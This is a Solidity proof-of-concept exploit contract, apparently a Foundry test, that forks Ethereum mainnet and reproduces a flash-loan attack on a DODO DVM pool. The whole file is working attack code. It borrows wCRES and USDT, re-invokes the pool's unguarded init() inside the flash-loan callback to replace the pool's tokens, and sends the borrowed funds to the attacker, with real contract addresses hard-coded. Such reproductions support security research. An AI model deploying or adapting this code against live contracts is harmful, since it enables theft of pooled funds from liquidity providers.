// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.9.0;

contract Exploit {
    IERC20 internal wCRES_token;
    USDT internal usdt_token;
    DVM internal dvm;
    CheatCodes internal cheats;
    address internal maintainer;
    address internal mtFeeRateModel;
    uint256 internal lpFeeRate;
    uint256 internal wCRES_amount;
    uint256 internal usdt_amount;
    uint256 internal iParam;
    uint256 internal k;
    bool internal isOpenTWAP;
    address internal token1;
    address internal token2;
    address internal attacker;

    function run() external returns (uint256) {
        cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
        cheats.createSelectFork("mainnet", 12000000);
        wCRES_token = IERC20(0xa0afAA285Ce85974c3C881256cB7F225e3A1178a);
        usdt_token = USDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
        dvm = DVM(0x051EBD717311350f1684f89335bed4ABd083a2b6);
        maintainer = 0x95C4F5b83aA70810D4f142d58e5F7242Bd891CB0;
        mtFeeRateModel = 0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01;
        lpFeeRate = 3000000000000000;
        token1 = 0x7f4E7fB900E0EC043718d05caEe549805CaB22C8;
        token2 = 0xf2dF8794f8F99f1Ba4D8aDc468EbfF2e47Cd7010;
        iParam = 1;
        k = 1000000000000000000;
        isOpenTWAP = false;
        wCRES_amount = 130000000000000000000000;
        usdt_amount = 1100000000000;
        attacker = msg.sender;

        uint256 initialBalance = wCRES_token.balanceOf(attacker) + usdt_token.balanceOf(attacker);
        dvm.flashLoan(wCRES_amount, usdt_amount, address(this), "whatever");
        uint256 finalBalance = wCRES_token.balanceOf(attacker) + usdt_token.balanceOf(attacker);
        return finalBalance - initialBalance;
    }

    function DVMFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        dvm.init(maintainer, token1, token2, lpFeeRate, mtFeeRateModel, iParam, k, isOpenTWAP);
        wCRES_token.transfer(attacker, wCRES_token.balanceOf(address(this)));
        usdt_token.transfer(attacker, usdt_token.balanceOf(address(this)));
        usdt_token.transfer(attacker, usdt_token.balanceOf(address(this)));
    }
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface USDT {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface DVM {
    function flashLoan(uint256 wCRES_amount, uint256 usdt_amount, address target, bytes calldata data) external;
    function init(address maintainer, address token1, address token2, uint256 lpFeeRate, address mtFeeRateModel, uint256 i, uint256 k, bool isOpenTWAP) external;
}

interface CheatCodes {
    function createSelectFork(string calldata, uint256) external returns (uint256);
}
